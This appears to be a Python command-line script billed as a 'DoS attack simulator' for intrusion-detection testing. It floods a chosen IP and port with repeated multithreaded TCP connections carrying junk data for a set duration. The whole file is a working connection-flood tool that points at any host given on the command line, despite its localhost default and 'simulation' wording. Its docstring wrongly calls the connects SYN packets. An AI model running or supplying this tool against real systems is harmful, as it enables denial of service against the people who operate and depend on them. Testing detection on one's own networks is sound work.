import socket
import threading
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

def dos_attack(target_ip, target_port, attack_duration=60, threads=10):
    """Simulates a DoS attack by sending multiple TCP SYN packets."""
    end_time = time.time() + attack_duration
    
    def send_packets():
        while time.time() < end_time:
            try:
                # Create a new socket for each connection attempt
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                # Send some data
                s.send(b"X" * 1024)
                # Don't wait for response, close and continue
                s.close()
            except:
                pass
            time.sleep(0.001)  # Small delay to prevent overwhelming the local system

    print(f"Starting DoS attack simulation against {target_ip}:{target_port}")
    print(f"Attack will run for {attack_duration} seconds using {threads} threads")
    print("Note: This is a simulation for testing purposes only!")
    
    # Create thread pool
    with ThreadPoolExecutor(max_workers=threads) as executor:
        # Submit tasks
        futures = [executor.submit(send_packets) for _ in range(threads)]
    
    print("\nAttack simulation completed")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DoS Attack Simulator for IDS Testing")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to use (default: 10)")
    
    args = parser.parse_args()
    
    dos_attack(args.target, args.port, args.duration, args.threads)
